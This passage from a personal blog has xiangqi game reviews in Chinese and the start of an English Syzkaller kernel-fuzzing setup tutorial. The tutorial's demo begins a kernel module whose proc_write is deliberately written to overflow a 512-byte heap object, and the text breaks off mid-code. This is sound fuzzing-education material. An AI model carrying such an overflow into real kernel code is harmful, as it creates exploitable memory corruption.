<p>此时红车九进一, 目的是再平四或者平六, 霸王车捅底士</p>
<p>此时黑飞象7进9也是正确的, 既消除了红炮三进七的手段,
也用8路车看住了6路士</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250408190613200.png"
alt="image-20250408190613200" />
<figcaption aria-hidden="true">image-20250408190613200</figcaption>
</figure>
</blockquote>
<ol start="16" type="1">
<li>车九平六 车２进６</li>
</ol>
<blockquote>
<p>此时红车九平六,打算在六路叠霸王车狠狠捅进去</p>
<p>黑走车2进6是错招, 黑2路车应该留守底线,
此时黑已经无法阻止有力的反击了, 随便走着玩吧</p>
<p>实战黑走车2进6, 考虑到中路有两炮, 想要从中路发起攻势, 然而这是错招.
红可直接车四平六叠霸王车, 无视黑反击, 现在捅下去就是杀.</p>
<p>即使黑中炮打出来将一军, 红只需要马换掉中炮, 此时霸王车捅下去还是杀,
黑来不及车2平5吃马, 必须先士6进5补一下.黑方白给一个炮, 可以投降了.</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250408191621029.png"
alt="image-20250408191621029" />
<figcaption aria-hidden="true">image-20250408191621029</figcaption>
</figure>
</blockquote>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2025/04/08/delicious/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/04/08/delicious/" class="post-title-link" itemprop="url">顺炮直车对横车 红过河车 复盘</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2025-04-08 03:00:00 / Modified: 03:36:21" itemprop="dateCreated datePublished" datetime="2025-04-08T03:00:00+08:00">2025-04-08</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="象棋复盘-顺炮直车对横车-红过河车"><a href="#象棋复盘-顺炮直车对横车-红过河车" class="headerlink" title="[象棋复盘] 顺炮直车对横车 红过河车"></a>[象棋复盘] 顺炮直车对横车 红过河车</h1><h2 id="对局记录"><a href="#对局记录" class="headerlink" title="对局记录"></a>对局记录</h2><ol>
<li><p>炮二平五 炮８平５</p>
</li>
<li><p>马二进三 马８进７</p>
</li>
<li><p>车一平二 车９进１</p>
</li>
<li><p>车二进六 车９平４</p>
</li>
<li><p>仕四进五 车４进７</p>
</li>
<li><p>马八进九 车４平２</p>
</li>
<li><p>炮八平六 车１进１</p>
</li>
<li><p>炮六进五 炮５退１</p>
</li>
<li><p>车二平三 炮５平７</p>
</li>
<li><p>车三平四 士４进５</p>
</li>
<li><p>炮六退三 车１平４</p>
</li>
<li><p>炮六平三 炮７进４</p>
</li>
<li><p>兵三进一 车４进３</p>
</li>
<li><p>兵七进一 象３进５</p>
</li>
<li><p>马九进七 车２退２</p>
</li>
<li><p>马七进五 车４平６</p>
</li>
<li><p>兵三进一 车６退１</p>
</li>
<li><p>马五进四 车２退２</p>
</li>
<li><p>马四进三 将５平４</p>
</li>
<li><p>炮五平六 炮２退１</p>
</li>
<li><p>前马进一 象５进７</p>
</li>
<li><p>马三进四 将４平５</p>
</li>
<li><p>炮六平三 象７退５</p>
</li>
<li><p>相三进五 炮２平３</p>
</li>
<li><p>相七进九 马２进３</p>
</li>
<li><p>兵九进一 车２平６</p>
</li>
</ol>
<h2 id="复盘分析"><a href="#复盘分析" class="headerlink" title="复盘分析"></a>复盘分析</h2><ol>
<li>炮二平五 炮８平５</li>
<li>马二进三 马８进７</li>
<li>车一平二 车９进１</li>
<li>车二进六 车９平４</li>
<li>仕四进五 车４进７</li>
<li>马八进九  …</li>
</ol>
<blockquote>
<p>到此双方走的都是正着，这里红走了一边马，害怕上正马被黑车平抠</p>
<p>实际上红完全可以上正马，当黑平车抠马时红左炮巡河暗保马，如果黑吃马, 红就有炮八平七打车打底象的双响炮</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250408002348491.png" alt="image-20250408002348491"></p>
</blockquote>
<ol start="6">
<li>…  车４平２</li>
</ol>
<blockquote>
<p>黑方左车急得跟马一样钻到红方被窝里，目的是单边封锁</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250408001958158.png" alt="image-20250408001958158"></p>
<p>黑方捉炮同时单边封锁红左车。然而此时红方不怕封锁，可以直接出左直车邀兑，看似会多丢一批马，但是实际上是一个先弃后取，黑右炮打出使得左马脱根，黑左马是个死马。推演如下：</p>
<p>7.车九平八 车2进1</p>
<p>8.马九退八 炮2进7  ，这里黑方大概率会打马，因为黑车已经千里迢迢报废了，步数上血亏，因此杀个马获取补偿</p>
<p>9.车二平三 马7退8 ， 如果黑马退窝心则铁门栓速摆，如果黑马7退9则红炮五进四，士4进5，炮八进六，黑马被捉死</p>
<p>10.车三进三 马8进9</p>
<p>11.炮五进四 士4进5</p>
<p>12.帅五平四 将5平4 ，红借帅做铁门栓，逼迫黑将出门</p>
<p>13.炮五进二，至此红方少一个马，但是黑方家里已经被拆烂了，黑方守不住</p>
<p>这个布局陷阱在 布局疑形与攻击 - 第一章 顺手炮类 - 第10局 突发冷箭</p>
</blockquote>
<ol start="7">
<li>炮八平六 车１进１</li>
</ol>
<blockquote>
<p>这里红方看似简单躲了一步炮，实际上是想再进五打马，让黑中卒失守，再把中炮打过去</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250408004926239.png" alt="image-20250408004926239"></p>
<p>我当时没考虑到这种意图，走车1进1，打算再平6出车，实际上这步出车也没有明确的目的。红可以车二平三压马，后续可以套炮或者进三兵攻击黑7路，黑左车不在家防守，黑7路将会十分被动。</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250408005829699.png" alt="image-20250408005829699"></p>
<p>因此此时黑最好应该走卒7进1，此时如果红还要车二平三压马，那么黑正好有时间抬横车平4然后伺机巡河守住，红来不及升巡河炮，红进三兵也可以被黑车象一起守住</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250408010144595.png" alt="image-20250408010144595"></p>
<p>还有一个问题是，在第6回合这里，黑方能否走马2进1？显然不能了，道理和走车1进1一样，缓一步棋使得7路马更加被动，并且车还没出来没法过去支援，更加被动</p>
</blockquote>
<ol start="8">
<li>炮六进五 炮５退１</li>
</ol>
<blockquote>
<p>当红炮六进五突袭后，吓我一跳。</p>
<p>当时想了三个应发，分别是士4进5&#x2F;车1平4&#x2F;炮5退1</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250408010835895.png" alt="image-20250408010835895"></p>
<p>（1） 士4进5</p>
<ol start="8">
<li><p>炮六进五 士4进5</p>
</li>
<li><p>炮六平三 炮2平7</p>
</li>
<li><p>车二平三 炮7平6</p>
</li>
</ol>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250408025634437.png" alt="image-20250408025634437"></p>
<p>到此黑方的单边封锁失败，中卒和底象都失守，显然红优</p>
<p>（2）车1平4</p>
<ol start="8">
<li><p>炮六进五 车1平4</p>
</li>
<li><p>炮六平三 炮2平7</p>
</li>
<li><p>车二平三 炮7退1</p>
</li>
<li><p>炮五进四 炮7平5</p>
</li>
<li><p>炮五进二 车2平4 ，铁门栓抢一步先手，形成霸王车</p>
</li>
<li><p>相三进五 士4进5</p>
</li>
<li><p>马三退四 后车进2 ， 目的是兑车保护卒林</p>
</li>
<li><p>车三平六 车4退5</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250408012359252.png" alt="image-20250408012359252"></p>
</li>
</ol>
<p>接下来红出直车先手抓马，红有多两个兵的优势。但是感觉大概率是和棋了</p>
</blockquote>
<ol start="9">
<li>车二平三 炮５平７</li>
</ol>
<blockquote>
<p>红方此时杀卒压马是错着，黑恰好可以炮5平7打车，红方失先</p>
</blockquote>
<ol start="10">
<li>车三平四 士４进５</li>
</ol>
<blockquote>
<p>红车三平四之后，此时是黑方最关键的一步棋，当时想到了四种走法：</p>
<p>士4进5&#x2F;马7进8&#x2F;炮7进5&#x2F;车1平4</p>
<p>士4进5很平庸，不至于失败，但是依旧消极防御</p>
<p>炮7进5&#x2F;马7进8&#x2F;车1平4都是有力的反击，能够化解红方的攻势</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250408013139080.png" alt="image-20250408013139080"></p>
<p>（1）士4进5，目的是驱赶红炮，同时补厚中路。也正是实战中我走出的一步。但是没有对冲红方的攻势，仍然在消极防御。</p>
<p>（2）马7进8，当时没敢走这一步，害怕此步导致中卒失守，红直接弃车炮五进四，眼见就要重炮杀，黑马还对退回盯住红后炮，或者黑需要上将解杀。</p>
<p>然而黑方此时有一步妙手可以解决红方重炮攻势，并让红方立刻被动：</p>
<p>炮2进1，拉住红方车炮，要求兑炮</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250408014655790.png" alt="image-20250408014655790"></p>
<p>实战没有看到这步，没走出来</p>
<p>（3）炮7进5，实战中也没走出这步来，也是忌惮红方中路的强大攻势，没看到炮2进1能够化解重炮杀</p>
<ol start="10">
<li><p>车三平四 炮7进5</p>
</li>
<li><p>车四平三 炮7进3</p>
</li>
<li><p>马三进四 炮7平9</p>
</li>
<li><p>马四进五 马7进5</p>
</li>
<li><p>炮五进四 炮2进1</p>
</li>
</ol>
<p>（4）车1平4，实战中也没走出这步来，还是忌惮红方中路的强大攻势，害怕被安上空头炮</p>
<p>具体说就是害怕红炮六平四蹩马腿，下一步炮五进四做重炮。然而这里黑方可以直接士4进5，炮五进四，士5进6得子，黑弃空头得一炮，红方左车未出，有空头也无可奈何，弃子不成立。</p>
<p>因此黑车1平4后红唯一正手是炮六退五，黑马2进3，跳起屏风马，并且7路随时反击，红中路攻势受阻，红六路炮进而又退，无功而返。黑方反先。</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250408020707632.png" alt="image-20250408020707632"></p>
</blockquote>
<ol start="11">
<li><p>炮六退三 车１平４</p>
</li>
<li><p>炮六平三 炮７进４</p>
</li>
<li><p>兵三进一 车４进３</p>
</li>
</ol>
<blockquote>
<p>此处黑车应该巡河还是骑河，我寻思了半天终于一口气走错了</p>
<p>我寻思巡河防止红三兵过河压马，但是太过被动</p>
<p>但是骑河也能做到，等红三兵过河后立刻跟在后面同时抓马，效果要比巡河主动。同时可以避免红再冲七兵。</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250408021507000.png" alt="image-20250408021507000"></p>
<p>巡河太过软弱，使得红兵得以七进一然后上马，红也可以马三进四蹬巡河车。</p>
</blockquote>
<ol start="14">
<li><p>兵七进一 象３进５</p>
</li>
<li><p>马九进七 车２退２</p>
</li>
</ol>
<blockquote>
<p>这里红方仓促马九进七，实际上后面会被黑车追亡逐北。</p>
<p>这里红方正手是马三进四，正好蹬一脚黑巡河车</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250408022000471.png" alt="image-20250408022000471"></p>
</blockquote>
<ol start="16">
<li>马七进五 车４平６</li>
</ol>
<blockquote>
<p>黑车4平6是整盘棋最臭的一步</p>
<p>当时我的想法是要求兑车，红车先杀黑车，然后黑马顺势前进，但是红车有根他不慌，红先兵三进一过河，这兵祖宗一下就令我汗流浃背了。原来平车邀兑全都是我的一厢情愿，小丑竟是我自己。</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250408022547827.png" alt="image-20250408022547827"></p>
<p>那么这里黑棋应该怎么走？</p>
<p>有马2进4和卒5进1两种</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250408023811608.png" alt="image-20250408023811608"></p>
<p>卒5进1，红马可以大胆马五进三，如白驹过隙，接下来后马、中炮、三兵都可以参战，攻势汹涌。黑方难以防御。这步进卒只爽了一时顶顶马，但是中卒脱根给了红方中炮当头的机会。</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250408024123427.png" alt="image-20250408024123427"></p>
<p>马2进4，防守住3卒和中卒，此时红要是再马五进三就不合适了，推演如下：</p>
<ol start="16">
<li>马七进五 马2进4</li>
<li>马五进三 车4退1</li>
<li>相三进一 车4平3</li>
</ol>
<p>接下来红前马没有好去处，要么就换掉中卒，趋向和棋</p>
</blockquote>
<p>从黑方这步臭棋之后，两位厨师长也是礼尚往来，只有更臭</p>
<ol start="17">
<li><p>兵三进一 车６退１</p>
</li>
<li><p>马五进四 车２退２</p>
</li>
</ol>
<blockquote>
<p>这个车2退2更臭，可以说黑方双手离开方向盘了</p>
<p>我当时想的是我2路仍然封锁着红车，它一时半会儿出不来，确实直车是一时半会儿出不来，但是横车两步就到我家门口！</p>
<p>我寻思红应该急于求成先走卧槽将军爽一下，这样我出个将就一点事都没有。然而红出个横车黑方立刻就无了。</p>
<p>然而对面水平也和我一样臭，他真就先卧槽爽爽，然后看我将5平4，于是炮五平六给我打招呼，</p>
<p>我说哥们缺个炮架不，他说你看我三马上来将不将你就完了。三马上来还得两步，主打一个松弛感。</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250408025153253.png" alt="image-20250408025153253"></p>
</blockquote>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2024/12/21/syzkaller%20I/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/12/21/syzkaller%20I/" class="post-title-link" itemprop="url">Syzkaller I - Get start</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2024-12-21 21:09:00 / Modified: 21:30:19" itemprop="dateCreated datePublished" datetime="2024-12-21T21:09:00+08:00">2024-12-21</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="syzkaller-iget-start">[Syzkaller I]Get start</h1>
<blockquote>
<p>Syzkaller is the start-of-the-art kernel fuzzer.</p>
<p>Syzkaller takes in a collection of syscall descriptions provided by
human experts as template , which provide the fuzzer awareness of the
type and arguments of syscalls to be called and dependencies between
syscalls . Then the fuzzer randomly generates test cases based on the
template , start a kernel to run the test cases , meanwhile monitor the
kernel state and collect crash reports.</p>
</blockquote>
<h2 id="x0-tldr">0x0 TL;DR</h2>
<p>This post will take a look at the Syzkaller environment setup , and I
will provide an ez demo to report a heap overflow in a kernel module.
Hopefully my time consuming debugging process can help you . Let's
go.</p>
<h2 id="x1-setup">0x1 setup</h2>
<h3 id="enable-cpu-feature-kvm">0.enable cpu feature kvm</h3>
<p>inspect the cpuinfo to make sure cpu support the kvm feature</p>
<ul>
<li>for intel:</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/cpuinfo | grep <span class="string">&quot;vmx&quot;</span> </span><br></pre></td></tr></table></figure>
<ul>
<li>for AMD:</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/cpuinfo | grep <span class="string">&quot;svm&quot;</span> </span><br></pre></td></tr></table></figure>
<h3 id="setup-golang-environment">1.setup golang environment</h3>
<blockquote>
<p>Golang version is 1.23.4 up to that time.</p>
</blockquote>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://go.dev/dl/go1.23.4.linux-amd64.tar.gz</span><br><span class="line">tar -xzf go1.23.4.linux-amd64.tar.gz</span><br></pre></td></tr></table></figure>
<p>add Gopath to environment</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> GOROOT=/path/to/go</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$GOROOT</span>/bin:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure>
<p>run <code>go version</code> to check Golang environment</p>
<h3 id="build-syzkaller">2.build Syzkaller</h3>
<blockquote>
<p>ensure your golang environment</p>
</blockquote>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/google/syzkaller/</span><br><span class="line"><span class="built_in">cd</span> syzkaller</span><br><span class="line">make</span><br></pre></td></tr></table></figure>
<h3 id="compile-linux-kernel">3.compile Linux kernel</h3>
<p>take Linux 5.14 for example</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget https://mirrors.edge.kernel.org/pub/linux/kernel/v5.x/linux-5.14.tar.xz</span><br><span class="line">tar -xf linux-5.14.tar.xz</span><br><span class="line"><span class="built_in">cd</span> linux-5.14</span><br><span class="line">make defconfig</span><br></pre></td></tr></table></figure>
<p>then append the following CONFIGS to .config</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_KCOV=y</span><br><span class="line">CONFIG_KCOV_INSTRUMENT_ALL=y</span><br><span class="line">CONFIG_KCOV_ENABLE_COMPARISONS=y</span><br><span class="line">CONFIG_DEBUG_FS=y</span><br><span class="line">CONFIG_DEBUG_KMEMLEAK=y</span><br><span class="line">CONFIG_DEBUG_INFO_DWARF_TOOLCHAIN_DEFAULT=y</span><br><span class="line">CONFIG_KALLSYMS=y</span><br><span class="line">CONFIG_KALLSYMS_ALL=y</span><br><span class="line">CONFIG_CONFIGFS_FS=y</span><br><span class="line">CONFIG_SECURITYFS=y</span><br><span class="line">CONFIG_NAMESPACES=y</span><br><span class="line">CONFIG_UTS_NS=y</span><br><span class="line">CONFIG_IPC_NS=y</span><br><span class="line">CONFIG_PID_NS=y</span><br><span class="line">CONFIG_NET_NS=y</span><br><span class="line">CONFIG_CGROUP_PIDS=y</span><br><span class="line">CONFIG_MEMCG=y</span><br><span class="line">CONFIG_CMDLINE_BOOL=y</span><br><span class="line">CONFIG_CMDLINE=&quot;net.ifnames=0&quot;</span><br><span class="line">CONFIG_KASAN=y</span><br><span class="line">CONFIG_KASAN_INLINE=y</span><br></pre></td></tr></table></figure>
<blockquote>
<p>more configs :</p>
<p>https://github.com/google/syzkaller/blob/master/docs/linux/kernel_configs.md</p>
</blockquote>
<p>the compile the kernel</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make -j `nproc`</span><br></pre></td></tr></table></figure>
<p>this will take for a while when you get a bootable kernel image .</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file ./arch/x86/boot/bzImage </span><br></pre></td></tr></table></figure>
<h3 id="build-virtual-hard-disk">4.build virtual hard disk</h3>
<p>to build a disk image with MBR and basic file system</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd /path/to/syzkaller</span><br><span class="line">mkdir image</span><br><span class="line">cp ./tools/create-image.sh ./image</span><br><span class="line">cd image</span><br><span class="line">./create-image.sh</span><br></pre></td></tr></table></figure>
<p>this will take for a while when you get bullseye.img as the disk
image and two ssh key file</p>
<blockquote>
<p>bullseye is the release name of Debian up to that time.</p>
</blockquote>
<h3 id="build-qemu">5.build QEMU</h3>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install qemu-system</span><br></pre></td></tr></table></figure>
<h3 id="run-the-kernel">6.run the kernel</h3>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 2G \</span><br><span class="line">    -smp 2 \</span><br><span class="line">    -no-reboot \</span><br><span class="line">    -kernel /path/to/linux-5.14/arch/x86/boot/bzImage \</span><br><span class="line">    -append <span class="string">&quot;console=ttyS0 root=/dev/sda earlyprintk=serial net.ifnames=0&quot;</span> \</span><br><span class="line">    -drive file=/path/to/syzkaller/image/bullseye.img,format=raw \</span><br><span class="line">    -net user,hostfwd=tcp:127.0.0.1:10021-:22 \</span><br><span class="line">    -net nic,model=e1000 \</span><br><span class="line">    -enable-kvm \</span><br><span class="line">    -nographic \</span><br><span class="line">    -pidfile vm.pid 2&gt;&amp;1 | <span class="built_in">tee</span> vm.log</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>Login as root without password</p>
<blockquote>
<p>errors :</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">network backend &#x27;user&#x27; is not compiled into this binary</span><br></pre></td></tr></table></figure>
<p>check this post :</p>
<p>https://stackoverflow.com/questions/75641274/network-backend-user-is-not-compiled-into-this-binary</p>
</blockquote>
<p>then make sure ssh is avaliable</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i ./image/bullseye.id_rsa -p 10021 -o <span class="string">&quot;StrictHostKeyChecking no&quot;</span> root@localhost</span><br></pre></td></tr></table></figure>
<h3 id="start-syzkaller">7.start SyzKaller</h3>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /path/to/syzkaller</span><br><span class="line"><span class="built_in">mkdir</span> workdir</span><br></pre></td></tr></table></figure>
<p>and edit a config file saved as default.cfg</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;target&quot;</span><span class="punctuation">:</span> <span class="string">&quot;linux/amd64&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;http&quot;</span><span class="punctuation">:</span> <span class="string">&quot;127.0.0.1:56741&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;workdir&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/path/to/syzkaller/workdir&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;kernel_obj&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/path/to/linux-5.14/&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;image&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/path/to/syzkaller/image/bullseye.img&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;sshkey&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/path/to/syzkaller/image/bullseye.id_rsa&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;syzkaller&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/path/to/syzkaller/&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;procs&quot;</span><span class="punctuation">:</span> <span class="number">8</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;qemu&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;vm&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;count&quot;</span><span class="punctuation">:</span> <span class="number">4</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;kernel&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/path/to/linux-5.14/arch/x86/boot/bzImage&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;cpu&quot;</span><span class="punctuation">:</span> <span class="number">2</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;mem&quot;</span><span class="punctuation">:</span> <span class="number">2048</span> <span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;cmdline&quot;</span><span class="punctuation">:</span> <span class="string">&quot;net.ifnames=0&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>run Syzkaller by:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bin/syz-manager -config=./default.cfg -debug</span><br></pre></td></tr></table></figure>
<p>meanwhile explorer 127.0.0.1:56741 to get a view of the current
fuzzing state</p>
<h2 id="x2-demo">0x2 demo</h2>
<p>take a kernel heap overflow for example.</p>
<h3 id="build-a-vulnability-kernel-module">1.build a vulnability kernel
module</h3>
<p>this module contains a heap overflow in function proc_write, and we
will compile it directly into the kernel</p>
<p>up to 4096 bytes can be written to a narrow 512 Byte slab object in
cache kmalloc-512</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/proc_fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/uaccess.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/slab.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">proc_open</span> <span class="params">(<span class="keyword">struct</span> inode *proc_inode, <span class="keyword">struct</span> file *proc_file)</span></span><br><span class="line">&#123;</span><br><span class="line">    printk(<span class="string">&quot;:into open!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">proc_read</span> <span class="params">(<span class="keyword">struct</span> file *proc_file, <span class="type">char</span> __user *proc_user, <span class="type">size_t</span> n, <span class="type">loff_t</span> *loff)</span></span><br><span class="line">&#123;</span><br><span class="line">    printk(<span class="string">&quot;:into read&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span 